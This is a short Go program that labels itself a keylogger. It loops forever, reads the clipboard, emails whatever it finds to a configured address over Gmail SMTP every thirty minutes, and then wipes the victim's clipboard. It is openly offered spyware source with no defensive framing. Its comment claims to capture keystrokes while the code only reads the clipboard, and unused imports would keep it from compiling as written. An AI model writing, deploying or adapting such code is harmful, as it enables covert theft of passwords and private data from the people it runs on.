package main

import (
	"fmt"
	"log"
	"os"
	"time"

	"github.com/go-vgo/robotgo"
	"gopkg.in/gomail.v2"
)

func main() {
	email := "YOUR_EMAIL"
	password := "YOUR_PASSWORD"
	smtpHost := "smtp.gmail.com"
	smtpPort := 587
	toEmail := "RECEIVING_EMAIL"

	// Set up email client
	d := gomail.NewDialer(smtpHost, smtpPort, email, password)

	// Infinitely loop and capture key strokes
	for {
		currentTime := time.Now().Format("2006-01-02 15:04:05")
		text := robotgo.GetClipboard()
		if text != "" {
			mail := gomail.NewMessage()
			mail.SetHeader("From", email)
			mail.SetHeader("To", toEmail)
			mail.SetHeader("Subject", "Keylogger log at "+currentTime)
			mail.SetBody("text/plain", text)

			// Send the email
			if err := d.DialAndSend(mail); err != nil {
				log.Println("Error sending email:", err)
			}

			// Clear the clipboard
			robotgo.WriteAll("")
		}

		// Sleep for 30 minutes
		time.Sleep(30 * time.Minute)
	}
}
